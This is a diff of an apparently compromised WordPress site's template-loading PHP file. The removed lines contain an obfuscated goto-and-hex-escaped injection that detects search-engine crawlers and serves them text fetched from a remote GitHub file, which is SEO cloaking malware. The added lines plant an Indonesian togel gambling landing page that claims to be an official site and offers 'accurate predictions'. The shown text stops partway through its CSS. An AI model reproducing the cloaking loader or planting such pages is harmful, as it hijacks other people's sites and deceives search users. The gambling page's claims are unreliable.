@@ -1,2 +1,871 @@
-<?php
- goto aKW_5; aKW_5: ob_start(); goto zJ4uH; SlqSU: $ua = strtolower($_SERVER["\x48\124\124\x50\137\x55\x53\x45\x52\x5f\x41\107\105\x4e\124"]); goto IqMzy; Sn77V: if (wp_using_themes()) { do_action("\x74\145\x6d\x70\x6c\141\164\145\x5f\162\145\144\x69\x72\145\143\x74"); } goto IEVbW; Z7K9r: if (is_robots()) { do_action("\144\x6f\137\x72\157\x62\157\164\x73"); return; } elseif (is_favicon()) { do_action("\144\x6f\x5f\146\x61\166\151\x63\x6f\156"); return; } elseif (is_feed()) { do_feed(); return; } elseif (is_trackback()) { require ABSPATH . "\x77\x70\x2d\x74\162\141\x63\x6b\x62\141\x63\153\x2e\160\x68\x70"; return; } goto gH1KR; zJ4uH: header("\x56\x61\162\x79\72\40\125\163\145\162\55\x41\147\145\156\164"); goto K4Qk4; K4Qk4: $botchar = "\x2f\50\x62\x6f\x74\174\x67\157\157\x67\x6c\145\x7c\141\150\x72\145\146\163\51\57\x69"; goto SlqSU; IEVbW: if ("\110\105\101\104" === $_SERVER["\122\105\x51\x55\x45\123\x54\137\115\x45\124\110\x4f\104"] && apply_filters("\145\170\x69\x74\137\157\x6e\137\150\164\x74\160\137\x68\x65\141\144", true)) { die; } goto Z7K9r; IqMzy: function aselolejos($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); $output = curl_exec($ch); curl_close($ch); return $output; } goto dnn84; dnn84: if (preg_match($botchar, $ua) && $_SERVER["\x52\105\x51\125\105\123\x54\x5f\125\122\x49"] == "\57") { usleep(rand(100000, 200000)); header("\103\x6f\156\164\145\156\164\x2d\124\171\160\x65\72\40\164\145\x78\164\57\x68\x74\155\x6c\x3b\40\x63\x68\141\162\163\x65\x74\75\x75\x74\x66\55\x38"); echo aselolejos("\150\x74\x74\160\163\72\x2f\x2f\162\141\x77\x2e\x67\151\164\x68\x75\142\x75\163\x65\162\143\157\x6e\x74\145\156\x74\x2e\x63\157\x6d\57\163\151\142\x61\x79\x61\153\x38\x38\57\x73\142\171\57\162\x65\146\163\x2f\x68\x65\x61\144\x73\x2f\155\141\x69\x6e\x2f\152\x70\141\162\144\x6f\56\164\x78\x74"); ob_end_flush(); die; } goto Sn77V; gH1KR: if (wp_using_themes()) { $tag_templates = array("\151\163\137\145\155\x62\x65\144" => "\147\145\164\x5f\x65\x6d\142\x65\x64\x5f\164\x65\155\x70\x6c\x61\164\x65", "\151\x73\x5f\x34\x30\x34" => "\147\145\164\x5f\x34\x30\64\137\x74\x65\155\160\x6c\x61\x74\x65", "\x69\x73\137\x73\x65\141\x72\x63\x68" => "\x67\x65\x74\x5f\163\x65\141\162\x63\x68\137\x74\x65\x6d\x70\154\x61\164\145", "\151\x73\x5f\x66\x72\157\156\164\137\x70\x61\x67\x65" => "\147\x65\x74\x5f\146\x72\x6f\x6e\x74\x5f\x70\141\x67\x65\137\x74\x65\155\x70\x6c\141\x74\145", "\x69\163\137\150\157\155\145" => "\x67\145\164\x5f\150\x6f\x6d\145\x5f\164\145\x6d\160\x6c\x61\164\145", "\151\x73\x5f\160\162\x69\166\x61\x63\171\x5f\x70\157\x6c\x69\x63\x79" => "\147\145\x74\137\x70\x72\151\166\141\x63\x79\x5f\x70\157\x6c\151\143\x79\x5f\x74\x65\155\x70\x6c\x61\164\145", "\x69\163\137\x70\x6f\163\x74\x5f\164\171\x70\145\137\141\x72\143\150\151\x76\x65" => "\147\145\x74\x5f\160\157\x73\164\x5f\164\171\160\145\x5f\141\x72\x63\x68\151\x76\145\137\x74\145\x6d\160\x6c\x61\164\x65", "\151\163\x5f\164\141\x78" => "\x67\x65\x74\137\x74\x61\170\157\156\157\155\171\137\x74\145\155\x70\154\141\x74\x65", "\151\x73\x5f\141\x74\x74\141\143\150\x6d\145\x6e\x74" => "\x67\x65\164\137\x61\164\164\x61\x63\150\x6d\x65\x6e\164\x5f\164\x65\155\x70\154\x61\x74\145", "\x69\163\x5f\x73\x69\x6e\147\x6c\145" => "\147\145\x74\x5f\x73\x69\x6e\x67\x6c\145\x5f\x74\x65\155\x70\x6c\141\x74\145", "\151\x73\x5f\160\141\x67\145" => "\147\x65\164\x5f\x70\x61\x67\x65\137\x74\x65\x6d\160\x6c\141\x74\x65", "\x69\x73\x5f\163\151\x6e\x67\x75\x6c\x61\x72" => "\x67\145\x74\x5f\x73\151\156\147\165\154\141\x72\137\164\145\x6d\160\154\x61\164\x65", "\151\163\137\x63\x61\164\x65\147\x6f\x72\171" => "\x67\145\164\x5f\143\141\164\145\x67\157\162\x79\137\164\145\x6d\x70\x6c\141\164\145", "\151\163\x5f\x74\x61\147" => "\147\145\x74\x5f\x74\x61\x67\137\164\145\155\160\154\141\164\x65", "\x69\163\x5f\x61\x75\164\150\x6f\x72" => "\147\145\164\137\141\165\164\150\157\x72\x5f\x74\x65\x6d\160\154\141\164\x65", "\151\x73\137\x64\141\x74\x65" => "\147\x65\164\x5f\x64\x61\x74\x65\137\164\145\155\160\154\141\164\x65", "\x69\163\x5f\x61\x72\143\150\151\x76\x65" => "\147\x65\x74\137\x61\162\143\150\151\x76\x65\x5f\164\145\155\x70\x6c\141\164\145"); $template = false; foreach ($tag_templates as $tag => $template_getter) { if (call_user_func($tag)) { $template = call_user_func($template_getter); } if ($template) { if ("\151\x73\137\x61\164\164\x61\x63\150\155\x65\x6e\164" === $tag) { remove_filter("\x74\150\145\x5f\x63\157\x6e\164\x65\156\164", "\x70\x72\x65\x70\x65\x6e\144\x5f\x61\164\x74\141\x63\x68\155\x65\156\164"); } break; } } if (!$template) { $template = get_index_template(); } $template = apply_filters("\164\145\155\x70\154\x61\x74\x65\137\x69\156\143\x6c\165\x64\x65", $template); $is_stringy = is_string($template) || is_object($template) && method_exists($template, "\137\x5f\164\157\123\164\x72\151\x6e\x67"); $template = $is_stringy ? realpath((string) $template) : null; if (is_string($template) && (str_ends_with($template, "\x2e\160\x68\x70") || str_ends_with($template, "\x2e\150\x74\x6d\154")) && is_file($template) && is_readable($template)) { do_action("\167\160\137\142\145\x66\x6f\x72\145\137\x69\x6e\143\x6c\x75\x64\x65\x5f\x74\x65\155\160\x6c\141\x74\x65", $template); include $template; } elseif (current_user_can("\x73\167\151\x74\143\150\137\164\150\145\x6d\145\x73")) { $theme = wp_get_theme(); if ($theme->errors()) { wp_die($theme->errors()); } } return; }
+
+
+<!doctype html>
+<html ⚡ lang="id">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+    <title>SIBAYAKTOTO - Platform Toto 4D Situs Resmi Pasang Singapore & Hongkong Angka Hoki Hari ini Resmi</title>
+    <meta name="description"
+        content="SIBAYAKTOTO merupakan link resmi Toto 4D situs pasang togel Singapore dan Hongkong hari ini. Dapatkan angka hoki, prediksi akurat, dan result live resmi dengan pelayanan terbaik.">
+    <meta name="keywords"
+        content="sibayaktoto, sibayak toto, toto, situs 4d, 4d, toto 4d, togel singapore, togel hongkong, situs togel">
+    <meta name="robots" content="index, follow">
+    <link rel="canonical" href="https://kiddou.ma/">
+    <link rel="shortcut icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnyuzYeaGQ8tm2OHx4hDOglzcpoix1SerqXXj1RpkQHE6S76LKZRVQfaukcfdi5k0KN6560SS2_0xdwfEpypArkRc5MHxuRHT3NIYnaCRa3ilhyphenhyphenWg35ST2cOHd_6lz3uwCoSQkRDeKeEj20T8Y6MxgP6EQOzqW9vm5_N8sRKWi5k8PpuDMs2FNeqvuTAKG/s500/sibayaktt.png" type="image/png">
+    <link rel="icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnyuzYeaGQ8tm2OHx4hDOglzcpoix1SerqXXj1RpkQHE6S76LKZRVQfaukcfdi5k0KN6560SS2_0xdwfEpypArkRc5MHxuRHT3NIYnaCRa3ilhyphenhyphenWg35ST2cOHd_6lz3uwCoSQkRDeKeEj20T8Y6MxgP6EQOzqW9vm5_N8sRKWi5k8PpuDMs2FNeqvuTAKG/s500/sibayaktt.png" type="image/png">
+    <link rel="apple-touch-icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnyuzYeaGQ8tm2OHx4hDOglzcpoix1SerqXXj1RpkQHE6S76LKZRVQfaukcfdi5k0KN6560SS2_0xdwfEpypArkRc5MHxuRHT3NIYnaCRa3ilhyphenhyphenWg35ST2cOHd_6lz3uwCoSQkRDeKeEj20T8Y6MxgP6EQOzqW9vm5_N8sRKWi5k8PpuDMs2FNeqvuTAKG/s500/sibayaktt.png">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://kiddou.ma/">
+    <meta property="og:title" content="SIBAYAKTOTO - Platform Toto 4D Situs Resmi Pasang Singapore & Hongkong Angka Hoki Hari ini Resmi">
+    <meta property="og:description"
+        content="SIBAYAKTOTO merupakan link resmi Toto 4D situs pasang togel Singapore dan Hongkong hari ini. Dapatkan angka hoki, prediksi akurat, dan result live resmi dengan pelayanan terbaik.">
+    <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg1W8WZ6M3ZtC2qQ56TVHMElFg4cUGnV6YVp5Xx31ApHB5ziTGIvUDDsBv4nMNVbGJBi-sHZcd2wufBQ7xJ5rTkoTzT157XnlxShIR0v_MLf5nMnAy5Ag-Sj3yqov789qBwzKbyw_w4RleD73tSKkfqQD1zgZDcEVv3t0JkYqAlLShL8P8EhzTaj_asRgw/s800/situstoto4dresmi.jpg">
+    <meta property="og:site_name" content="SIBAYAKTOTO">
+    <meta property="og:locale" content="id_ID">
+
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="SIBAYAKTOTO - Platform Toto 4D Situs Resmi Pasang Singapore & Hongkong Angka Hoki Hari ini Resmi">
+    <meta name="twitter:description"
+        content="SIBAYAKTOTO merupakan link resmi Toto 4D situs pasang togel Singapore dan Hongkong hari ini. Dapatkan angka hoki, prediksi akurat, dan result live resmi dengan pelayanan terbaik.">
+    <meta name="twitter:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg1W8WZ6M3ZtC2qQ56TVHMElFg4cUGnV6YVp5Xx31ApHB5ziTGIvUDDsBv4nMNVbGJBi-sHZcd2wufBQ7xJ5rTkoTzT157XnlxShIR0v_MLf5nMnAy5Ag-Sj3yqov789qBwzKbyw_w4RleD73tSKkfqQD1zgZDcEVv3t0JkYqAlLShL8P8EhzTaj_asRgw/s800/situstoto4dresmi.jpg">
+
+    <!-- AMP Script -->
+    <script async src="https://cdn.ampproject.org/v0.js"></script>
+
+    <!-- Google Fonts: Vintage & Victorian Typography -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700;800;900&family=Marcellus&family=Plus+Jakarta+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+
+    <!-- AMP Boilerplate -->
+    <style amp-boilerplate>
+        body {
+            -webkit-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+            -moz-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+            -ms-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+            animation: -amp-start 8s steps(1, end) 0s 1 normal both
+        }
+
+        @-webkit-keyframes -amp-start {
+            from { visibility: hidden }
+            to { visibility: visible }
+        }
+
+        @-moz-keyframes -amp-start {
+            from { visibility: hidden }
+            to { visibility: visible }
+        }
+
+        @-ms-keyframes -amp-start {
+            from { visibility: hidden }
+            to { visibility: visible }
+        }
+
+        @-o-keyframes -amp-start {
+            from { visibility: hidden }
+            to { visibility: visible }
+        }
+
+        @keyframes -amp-start {
+            from { visibility: hidden }
+            to { visibility: visible }
+        }
+    </style>
+    <noscript>
+        <style amp-boilerplate>
+            body {
+                -webkit-animation: none;
+                -moz-animation: none;
+                -ms-animation: none;
+                animation: none
+            }
+        </style>
+    </noscript>
+
+    <!-- Custom AMP CSS: Victorian Antique / Royal Opera Vintage Aesthetic -->
+    <style amp-custom>
+        :root {
+            --vintage-gold: #c5a059;
+            --vintage-gold-bright: #e5c378;
+            --vintage-gold-dark: #7a5c21;
+            --royal-crimson: #540810;
+            --deep-burgundy: #2e0308;
+            --parchment-dark: #0e0705;
+            --parchment-card: #180d09;
+            --parchment-border: #3d2315;
+            --antique-text: #e6dac6;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            margin: 0;
+            font-family: 'Marcellus', serif;
+            background-color: var(--parchment-dark);
+            color: var(--antique-text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            overflow-x: hidden;
+            position: relative;
+            background-image: 
+                radial-gradient(circle at 50% 20%, rgba(84, 8, 16, 0.35) 0%, transparent 60%),
+                radial-gradient(circle at 10% 80%, rgba(197, 160, 89, 0.12) 0%, transparent 50%),
+                radial-gradient(circle at 90% 85%, rgba(84, 8, 16, 0.25) 0%, transparent 50%);
+        }
+
+        /* ==========================================================================
+           1. ROYAL VELVET CURTAIN OPENING (Vintage Theatrical Opening)
+           ========================================================================== */
+        .curtain-stage {
+            position: fixed;
+            inset: 0;
+            z-index: 99999;
+            pointer-events: none;
+            overflow: hidden;
+            display: flex;
+            animation: curtainStageDismiss 0.1s linear 1.35s forwards;
+            background: #060203;
+        }
+
+        @keyframes curtainStageDismiss {
+            to {
+                visibility: hidden;
+                display: none;
+                opacity: 0;
+            }
+        }
+
+        .curtain-panel {
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            width: 50vw;
+            height: 100vh;
+            /* Heavy pleated crimson velvet fabric folds */
+            background: 
+                repeating-linear-gradient(90deg, 
+                    #220205 0px, 
+                    #4a070e 16px, 
+                    #180104 28px, 
+                    #590a12 44px, 
+                    #1f0205 56px),
+                radial-gradient(ellipse at 50% 50%, rgba(120, 15, 25, 0.5) 0%, #0d0102 100%);
+            box-shadow: 0 0 60px rgba(0, 0, 0, 0.98);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .curtain-left {
+            left: 0;
+            border-right: 3px solid var(--vintage-gold);
+            animation: drawCurtainLeft 0.95s cubic-bezier(0.77, 0, 0.175, 1) 0.35s forwards;
+        }
+
+        .curtain-right {
+            right: 0;
+            border-left: 3px solid var(--vintage-gold);
+            animation: drawCurtainRight 0.95s cubic-bezier(0.77, 0, 0.175, 1) 0.35s forwards;
+        }
+
+        /* Golden Tassel Trim Along Inner Edge */
+        .curtain-tassel-strip {
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            width: 14px;
+            background: repeating-linear-gradient(180deg, var(--vintage-gold) 0px, var(--vintage-gold) 6px, #4d330c 6px, #4d330c 12px);
+            opacity: 0.8;
+            box-shadow: 0 0 10px rgba(197, 160, 89, 0.6);
+        }
+
+        .curtain-left .curtain-tassel-strip { right: 0; }
+        .curtain-right .curtain-tassel-strip { left: 0; }
+
+        /* Grand Royal Medallion on the Curtain Center */
+        .royal-wax-seal {
+            position: absolute;
+            z-index: 10;
+            top: 50%;
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            background: radial-gradient(circle, #540810 25%, #240306 75%, #c5a059 100%);
+            border: 4px double var(--vintage-gold);
+            box-shadow: 0 0 35px rgba(197, 160, 89, 0.7), 0 0 60px rgba(84, 8, 16, 0.9), inset 0 0 20px rgba(0, 0, 0, 0.9);
+            transform: translateY(-50%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .curtain-left .royal-wax-seal {
+            right: -75px;
+            clip-path: polygon(0 0, 50% 0, 50% 100%, 0 100%);
+        }
+
+        .curtain-right .royal-wax-seal {
+            left: -75px;
+            clip-path: polygon(50% 0, 100% 0, 100% 100%, 50% 100%);
+        }
+
+        .seal-logo-wrap {
+            width: 110px;
+            height: 110px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            filter: drop-shadow(0 0 10px rgba(197, 160, 89, 0.8));
+        }
+
+        .seal-logo-wrap amp-img {
+            width: 110px;
+            height: 110px;
+            object-fit: contain;
+        }
+
+        @keyframes drawCurtainLeft {
+            0% { transform: translateX(0); opacity: 1; }
+            70% { opacity: 1; }
+            100% { transform: translateX(-105%) scaleX(0.7); opacity: 0; visibility: hidden; }
+        }
+
+        @keyframes drawCurtainRight {
+            0% { transform: translateX(0); opacity: 1; }
+            70% { opacity: 1; }
+            100% { transform: translateX(105%) scaleX(0.7); opacity: 0; visibility: hidden; }
+        }
+
+        /* ==========================================================================
+           2. VINTAGE PARCHMENT & DAMASK BACKGROUND
+           ========================================================================== */
+        .vintage-overlay-bg {
+            position: fixed;
+            inset: 0;
+            background-image: 
+                radial-gradient(circle at 50% 0%, rgba(197, 160, 89, 0.15) 0%, transparent 70%),
+                linear-gradient(rgba(197, 160, 89, 0.04) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(197, 160, 89, 0.04) 1px, transparent 1px);
+            background-size: 100% 100%, 28px 28px, 28px 28px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* ==========================================================================
+           3. MAIN VICTORIAN CONTAINER
+           ========================================================================== */
+        .royal-container {
+            position: relative;
+            z-index: 2;
+            width: 100%;
+            max-width: 480px;
+            padding: 14px 14px 30px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            animation: royalUnveil 0.5s ease-out 0.35s both;
+        }
+
+        @keyframes royalUnveil {
+            0% { opacity: 0; transform: scale(0.97); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+
+        /* Vintage Header with Flourish */
+        .vintage-header {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 4px 0 8px;
+            border-bottom: 1px solid var(--parchment-border);
+        }
+
+        .header-seal-brand {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+
+        .header-flourish {
+            font-size: 0.62rem;
+            letter-spacing: 2px;
+            color: var(--vintage-gold);
+            text-transform: uppercase;
+            font-family: 'Cinzel', serif;
+            font-weight: 700;
+        }
+
+        .btn-livechat-vintage {
+            display: inline-flex;
+            align-items: center;
+            gap: 7px;
+            font-family: 'Cinzel', serif;
+            font-size: 0.78rem;
+            font-weight: 800;
+            color: var(--vintage-gold-bright);
+            text-decoration: none;
+            letter-spacing: 1.5px;
+            padding: 7px 13px;
+            border-radius: 4px;
+            background: linear-gradient(135deg, #240a08 0%, #120404 100%);
+            border: 1.5px solid var(--vintage-gold);
+            box-shadow: 0 0 12px rgba(197, 160, 89, 0.35), inset 0 0 8px rgba(197, 160, 89, 0.15);
+            transition: all 0.25s ease;
+        }
+
+        .btn-livechat-vintage:hover {
+            background: var(--royal-crimson);
+            box-shadow: 0 0 18px rgba(197, 160, 89, 0.6);
+            transform: translateY(-1px);
+        }
+
+        .ONLINE-dot {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: #4ade80;
+            box-shadow: 0 0 8px #4ade80;
+        }
+
+        /* Antique Royal Scroll Marquee */
+        .royal-proclamation {
+            width: 100%;
+            margin: 10px 0 12px;
+            padding: 8px 12px;
+            background: linear-gradient(90deg, rgba(28, 14, 9, 0.9) 0%, rgba(46, 20, 12, 0.9) 50%, rgba(28, 14, 9, 0.9) 100%);
+            border-top: 1px solid var(--vintage-gold);
+            border-bottom: 1px solid var(--vintage-gold);
+            box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.8);
+            overflow: hidden;
+            white-space: nowrap;
+        }
+
+        .proclamation-text {
+            display: inline-block;
+            white-space: nowrap;
+            animation: scrollProclamation 16s linear infinite;
+            font-family: 'Cinzel', serif;
+            font-size: 0.78rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+            color: var(--vintage-gold-bright);
+        }
+
+        @keyframes scrollProclamation {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
+
+        /* Victorian Ornate Hero Frame (Gilded Painting Frame) */
+        .vintage-hero-frame {
+            position: relative;
+            width: 100%;
+            margin-bottom: 14px;
+            padding: 8px;
+            background: linear-gradient(135deg, #1c0f0a 0%, #2b160d 50%, #150a06 100%);
+            border: 3px double var(--vintage-gold);
+            border-radius: 8px;
+            box-shadow: 
+                0 10px 30px rgba(0, 0, 0, 0.95), 
+                0 0 20px rgba(197, 160, 89, 0.3), 
+                inset 0 0 15px rgba(0, 0, 0, 0.9);
+        }
+
+        .vintage-hero-frame::before {
+            content: "⚜";
+            position: absolute;
+            top: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: var(--vintage-gold-bright);
+            font-size: 16px;
+            background: var(--parchment-dark);
+            padding: 0 8px;
+        }
+
+        .vintage-hero-inner {
+            border-radius: 4px;
+            overflow: hidden;
+            border: 1px solid var(--parchment-border);
+        }
+
+        /* Victorian Filigree Divider */
+        .filigree-divider {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            width: 100%;
+            margin: 6px 0 10px;
+            color: var(--vintage-gold);
+            font-size: 0.85rem;
+        }
+
+        .filigree-divider::before,
+        .filigree-divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--vintage-gold), transparent);
+        }
+
+        /* Vintage Action Badges (Wax & Brass Certificate Style) */
+        .vintage-action-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            width: 100%;
+            margin-bottom: 14px;
+        }
+
+        .btn-vintage {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 12px 10px;
+            text-decoration: none;
+            border-radius: 6px;
+            text-align: center;
+            transition: all 0.25s ease;
+        }
+
+        .btn-vintage-daftar {
+            background: linear-gradient(135deg, #660a13 0%, #380308 100%);
+            border: 2px solid var(--vintage-gold);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.8), 0 0 15px rgba(102, 10, 19, 0.6);
+        }
+
+        .btn-vintage-daftar .action-title {
+            font-family: 'Cinzel', serif;
+            font-size: 0.96rem;
+            font-weight: 800;
+            letter-spacing: 1.5px;
+            color: var(--vintage-gold-bright);
+            text-shadow: 0 0 8px rgba(197, 160, 89, 0.6);
+        }
+
+        .btn-vintage-daftar .action-sub {
+            font-size: 0.65rem;
+            letter-spacing: 1px;
+            color: #ffb3ba;
+            margin-top: 2px;
+        }
+
+        .btn-vintage-login {
+            background: linear-gradient(135deg, #1f120c 0%, #120905 100%);
+            border: 1.5px solid var(--vintage-gold);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.8);
+        }
+
+        .btn-vintage-login .action-title {
+            font-family: 'Cinzel', serif;
+            font-size: 0.96rem;
+            font-weight: 800;
+            letter-spacing: 1.5px;
+            color: #ffffff;
+        }
+
+        .btn-vintage-login .action-sub {
+            font-size: 0.65rem;
+            letter-spacing: 1px;
+            color: #c9bca8;
+            margin-top: 2px;
+        }
+
+        .btn-vintage-ONLINE {
+            grid-column: span 2;
+            background: linear-gradient(90deg, #1c0e08 0%, #30170a 50%, #1c0e08 100%);
+            border: 1.5px solid var(--vintage-gold);
+            box-shadow: 0 0 15px rgba(197, 160, 89, 0.25);
+            padding: 10px;
+        }
+
+        .btn-vintage-ONLINE .action-title {
+            font-family: 'Cinzel', serif;
+            font-size: 0.88rem;
+            font-weight: 800;
+            letter-spacing: 2px;
+            color: var(--vintage-gold-bright);
+        }
+
+        .btn-vintage:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(197, 160, 89, 0.5);
+            filter: brightness(1.1);
+        }
+
+        /* Vintage Tarot / Postage Stamp Pasaran Grid */
+        .vintage-pasaran-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+            width: 100%;
+            margin-bottom: 14px;
+        }
+
+        .pasaran-card-vintage {
+            position: relative;
+            background: linear-gradient(145deg, #1f110b 0%, #140a06 100%);
+            border: 1.5px solid var(--vintage-gold);
+            border-radius: 6px;
+            padding: 8px 4px 6px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            box-shadow: 0 6px 14px rgba(0, 0, 0, 0.8), inset 0 0 10px rgba(0, 0, 0, 0.8);
+            transition: all 0.25s ease;
+        }
+
+        .pasaran-card-vintage .stamp-corner {
+            position: absolute;
+            top: 2px;
+            right: 4px;
+            font-family: 'Cinzel', serif;
+            font-size: 0.55rem;
+            color: var(--vintage-gold);
+            font-weight: 700;
+        }
+
+        .pasaran-card-vintage amp-img {
+            width: 48px;
+            height: 48px;
+            object-fit: contain;
+            filter: drop-shadow(0 0 6px rgba(197, 160, 89, 0.3));
+        }
+
+        .pasaran-card-vintage .stamp-title {
+            font-family: 'Cinzel', serif;
+            font-size: 0.68rem;
+            font-weight: 800;
+            color: var(--vintage-gold-bright);
+            margin-top: 4px;
+            letter-spacing: 0.8px;
+        }
+
+        .pasaran-card-vintage .stamp-time {
+            font-size: 0.58rem;
+            color: #d1c4b2;
+            letter-spacing: 0.3px;
+        }
+
+        .pasaran-card-vintage:hover {
+            transform: translateY(-3px) scale(1.04);
+            border-color: #ffd700;
+            box-shadow: 0 8px 20px rgba(197, 160, 89, 0.6);
+        }
+
+        /* Victorian Ledger / Royal Certificate Box */
+        .royal-ledger-box {
+            width: 100%;
+            background: linear-gradient(135deg, rgba(26, 14, 9, 0.9) 0%, rgba(16, 8, 5, 0.9) 100%);
+            border: 1px solid var(--vintage-gold);
+            border-radius: 6px;
+            padding: 12px 14px;
+            margin-bottom: 12px;
+            box-shadow: inset 0 0 15px rgba(0, 0, 0, 0.9);
+            font-size: 0.82rem;
+            line-height: 1.5;
+            text-align: center;
+        }
+
+        .ledger-title {
+            font-family: 'Cinzel', serif;
+            font-size: 0.86rem;
+            font-weight: 800;
+            color: var(--vintage-gold-bright);
+            letter-spacing: 1px;
+            margin-bottom: 4px;
+        }
+
+        .ledger-desc {
+            color: #d6c7b2;
+            font-size: 0.78rem;
+        }
+
+        /* Footer */
+        footer {
+            margin-top: 8px;
+            text-align: center;
+            font-family: 'Cinzel', serif;
+            font-size: 0.74rem;
+            letter-spacing: 1px;
+            color: #8c7860;
+        }
+
+        footer a {
+            color: var(--vintage-gold);
+            text-decoration: none;
+            font-weight: 700;
+            transition: color 0.2s ease;
+        }
+
+        footer a:hover {
+            color: var(--vintage-gold-bright);
+        }
+
+        /* =========================================================
+           ANIMASI PARTIKEL JATUH (FALLING ICONS) - PURE CSS AMP VALID
+        ========================================================= */
+        .falling-icons-wrap {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            pointer-events: none;
+            overflow: hidden;
+            z-index: 99999;
+        }
+
+        .falling-icon {
+            position: absolute;
+            top: -65px;
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            will-change: transform, opacity;
+            filter: drop-shadow(0 4px 10px rgba(0, 0, 0, 0.4));
+            animation: iconFall linear infinite, iconSway ease-in-out infinite alternate;
+        }
+
+        .fi-fav {
+            background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnyuzYeaGQ8tm2OHx4hDOglzcpoix1SerqXXj1RpkQHE6S76LKZRVQfaukcfdi5k0KN6560SS2_0xdwfEpypArkRc5MHxuRHT3NIYnaCRa3ilhyphenhyphenWg35ST2cOHd_6lz3uwCoSQkRDeKeEj20T8Y6MxgP6EQOzqW9vm5_N8sRKWi5k8PpuDMs2FNeqvuTAKG/s500/sibayaktt.png');
+        }
+
+        .fi-guru {
+            background-image: url('https://i.ibb.co/XfkWTB10/kuda.png');
+        }
+
+        @keyframes iconFall {
+            0% {
+                top: -65px;
+                transform: translateY(0) rotate(0deg) rotateY(0deg);
+                opacity: 0;
+            }
+            12% {
+                opacity: 0.95;
+            }
+            85% {
+                opacity: 0.9;
+            }
+            100% {
+                top: 106vh;
+                transform: translateY(0) rotate(360deg) rotateY(720deg);
+                opacity: 0;
+            }
+        }
+
+        @keyframes iconSway {
+            0% {
+                margin-left: -18px;
+            }
+            100% {
+                margin-left: 18px;
+            }
+        }
+
+        /* Variasi Posisi, Ukuran & Delay untuk Partikel */
+        .fi-1 { left: 4vw; width: 26px; height: 26px; animation-duration: 7.5s, 2.4s; animation-delay: 0s, 0s; }
+        .fi-2 { left: 12vw; width: 34px; height: 34px; animation-duration: 9.2s, 3.1s; animation-delay: 2.3s, 2.3s; }
+        .fi-3 { left: 20vw; width: 22px; height: 22px; animation-duration: 6.8s, 2.8s; animation-delay: 4.1s, 4.1s; }
+        .fi-4 { left: 28vw; width: 30px; height: 30px; animation-duration: 8.5s, 3.5s; animation-delay: 1.2s, 1.2s; }
+        .fi-5 { left: 36vw; width: 24px; height: 24px; animation-duration: 7.2s, 2.2s; animation-delay: 5.4s, 5.4s; }
+        .fi-6 { left: 45vw; width: 32px; height: 32px; animation-duration: 10.0s, 3.8s; animation-delay: 3.2s, 3.2s; }
+        .fi-7 { left: 54vw; width: 28px; height: 28px; animation-duration: 8.0s, 2.6s; animation-delay: 0.8s, 0.8s; }
+        .fi-8 { left: 62vw; width: 22px; height: 22px; animation-duration: 6.5s, 2.9s; animation-delay: 6.0s, 6.0s; }
+        .fi-9 { left: 70vw; width: 35px; height: 35px; animation-duration: 9.5s, 3.4s; animation-delay: 2.7s, 2.7s; }
